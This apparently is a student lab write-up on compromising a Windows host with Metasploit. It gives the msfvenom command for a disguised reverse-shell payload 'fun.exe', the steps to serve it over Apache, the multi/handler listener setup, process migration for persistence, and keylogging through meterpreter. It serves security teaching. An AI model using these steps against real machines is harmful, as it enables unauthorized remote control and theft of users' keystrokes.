# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:
![e1](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/0defb30c-c8be-4e0a-9617-85818a890de2)



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![e2](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/c25fc240-0dfb-4e0b-9772-ea06eda38818)



copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![e3](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/5a76afe6-bb80-4638-ad25-b41edbc35050)



Start apache server
sudo systemctl apache2 start

## OUTPUT:
![e4](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/6cdd95ed-55b3-4fcd-bac8-f2ce71240938)


Check the status of apache2

## OUTPUT:
![e5](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/da7c732b-97ca-4b14-acb8-c0006b2bb812)



## Invoke msfconsole:

## OUTPUT:
![e6](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/f866016b-8406-4244-b4be-52066ae46fa7)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT:
![e7](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/b1e18bda-9978-467c-94e4-3fb29616a86d)



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

## OUTPUT:
![e8](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/e48585f1-724d-432f-af30-239f765d6612)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.

## OUTPUT:
![e9](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/5c9fb543-72ac-4085-a967-dd57723d4f03)



Bypass any warning boxes, double-click the file, and allow it to run.

## OUTPUT:
![e10](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/fba09e8e-bee8-4139-a7a9-21418d203370)


On kali give the command exploit

## OUTPUT:
![e11](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/32713c22-b460-4463-b756-c0146aeabb12)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

## OUTPUT:
![e12](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/78afeb09-0570-4632-a2d0-6a1a470ff04a)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT:
![e13](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/62bd7d28-c063-4da5-b3dc-a9d6712ae18b)


## Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT:
![e14](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/83c9a0ba-7cb8-4eb8-8681-1ba4a53db842)

![e15](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/ed36931d-8a94-41e6-bafd-679acceaaf46)


keyscan_dump	Shows the keystrokes captured so far

## OUTPUT:
![e16](https://github.com/anto-richard/Compromising-windows-using-Metasploit/assets/93427534/16b0c0f0-896c-43b3-93f2-556261dae7e7)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
